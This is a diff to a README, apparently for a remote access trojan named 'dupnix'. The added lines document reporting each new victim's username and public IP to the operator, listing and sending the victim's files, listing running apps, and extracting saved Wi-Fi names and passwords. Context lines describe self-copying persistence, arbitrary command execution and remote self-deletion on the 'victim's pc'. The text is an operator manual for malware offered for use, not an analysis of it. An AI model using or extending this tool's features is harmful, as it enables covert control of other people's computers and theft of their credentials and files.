@@ -57,6 +57,7 @@
 
 ### Autostart
 * if you have turned it on you can put your executable whenever you want, it will automaticly copy it self to %temp% and add to autostart
+* after that it will send info about new user, username and public ip
 
 ### Commands
 * Before all commands should be an ID, default ID is `X` but use it only for `SetID`
@@ -65,7 +66,7 @@
 ### All available commands:
 #### Status
 * Shows a lot of useful info
-#### ![image](https://user-images.githubusercontent.com/74505994/145389335-52774143-a362-4a62-a88b-a1235135c75d.png)
+#### ![image](https://user-images.githubusercontent.com/74505994/146406578-7aa5e4db-b212-4538-9222-940f0f7e20bf.png)
 #### cmd <command>
  * Performs a command, e.g `cmd shutdown /h`
 #### SetCursor <X,Y>
@@ -129,6 +130,17 @@
  * It may be useful to plan sth, e.g `Sleep 3600 && shutdown /h`
 #### ErrorSound
  * Just makes an ErrorSound
+#### RunningApps
+ * List of running first-plan apps
+#### ![image](https://user-images.githubusercontent.com/74505994/146406835-d8de34ef-eef3-4928-a93c-2bc80eeca871.png)
+#### ALL_ID (without <id>)
+ * every victim sends its id, your not using <id>, just `ALL_ID`
+#### ListOfFiles <path>
+ * Sends you every file in given directory
+#### ![image](https://user-images.githubusercontent.com/74505994/146407474-0aca95b0-220c-4f01-885f-b1e0c51a6792.png)
+#### WifiList
+ * Gives you a list of Wifi names and passwords for them
+
 #### Delitself
  * Remote deleting dupnix from victim's pc
 #### Update <link to new version>
